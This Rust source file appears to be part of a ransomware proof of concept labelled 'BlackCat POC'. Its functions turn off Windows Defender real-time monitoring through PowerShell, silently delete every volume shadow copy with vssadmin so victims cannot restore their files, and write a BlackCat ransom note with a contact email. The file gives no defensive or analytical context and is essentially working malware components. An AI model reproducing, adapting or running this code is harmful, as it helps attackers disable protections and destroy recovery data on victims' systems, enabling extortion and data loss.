use std::process::Command;

pub struct WindowsPlatform;

impl WindowsPlatform {
    #[cfg(target_os = "windows")]
    pub fn disable_windows_defender() -> Result<(), String> {
        let output = Command::new("powershell")
            .args(&[
                "-Command",
                "Set-MpPreference -DisableRealtimeMonitoring $true",
            ])
            .output();

        match output {
            Ok(result) => {
                if result.status.success() {
                    Ok(())
                } else {
                    Err("Failed to disable Windows Defender".to_string())
                }
            }
            Err(e) => Err(format!("Command execution failed: {}", e)),
        }
    }

    #[cfg(target_os = "windows")]
    pub fn delete_shadow_copies() -> Result<(), String> {
        let output = Command::new("cmd")
            .args(&["/c", "vssadmin delete shadows /all /quiet"])
            .output();

        match output {
            Ok(result) => {
                if result.status.success() {
                    Ok(())
                } else {
                    Err("Failed to delete shadow copies".to_string())
                }
            }
            Err(e) => Err(format!("Command execution failed: {}", e)),
        }
    }

    #[cfg(target_os = "windows")]
    pub fn create_ransom_note(directory: &str) -> Result<(), String> {
        let ransom_content = r#"
========== BLACKCAT RANSOMWARE ==========
Your files have been encrypted.
To recover your data, contact us at:
Email: blackcat@protonmail.com
Include this ID: ABC123DEF456GHI789
==========================================
"#;

        let note_path = format!("{}\\README_BLACKCAT.txt", directory);
        std::fs::write(&note_path, ransom_content)
            .map_err(|e| format!("Failed to create ransom note: {}", e))?;

        Ok(())
    }

    #[cfg(not(target_os = "windows"))]
    pub fn disable_windows_defender() -> Result<(), String> {
        Err("This function is only available on Windows".to_string())
    }

    #[cfg(not(target_os = "windows"))]
    pub fn delete_shadow_copies() -> Result<(), String> {
        Err("This function is only available on Windows".to_string())
    }

    #[cfg(not(target_os = "windows"))]
    pub fn create_ransom_note(_directory: &str) -> Result<(), String> {
        Err("This function is only available on Windows".to_string())
    }

    pub fn get_system_info() -> String {
        "Windows System - BlackCat POC".to_string()
    }
}
